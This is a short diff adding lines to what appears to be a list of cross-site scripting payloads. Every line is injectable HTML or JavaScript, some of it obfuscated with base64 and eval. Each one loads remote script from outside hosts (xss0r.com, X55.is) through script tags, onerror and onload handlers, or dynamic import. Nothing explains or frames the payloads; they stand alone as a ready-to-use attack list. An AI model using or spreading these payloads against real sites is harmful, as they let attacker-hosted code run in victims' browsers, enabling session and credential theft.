@@ -3,6 +3,11 @@
 1'/*\'/*"/*\"/*</Script/--><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=22861/.source))//>
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=22861/.source))}//\76-->
 '"><script src=https://xss0r.com/c/lostsec></script>
+<script type="module">import('https://xss0r.com/c/lostsec');</script>
+<img src=x onerror="import('https://xss0r.com/c/lostsec')">
+<svg/onload="import('https://xss0r.com/c/lostsec')">
+(()=>{import('https://xss0r.com/c/lostsec')})()
+import(/*trick*/'https://xss0r.com/c/lostsec')
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvbG9zdHNlYyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
 "><div autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss0r.com/c/lostsec'"></div>
 <input autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss0r.com/c/lostsec';">
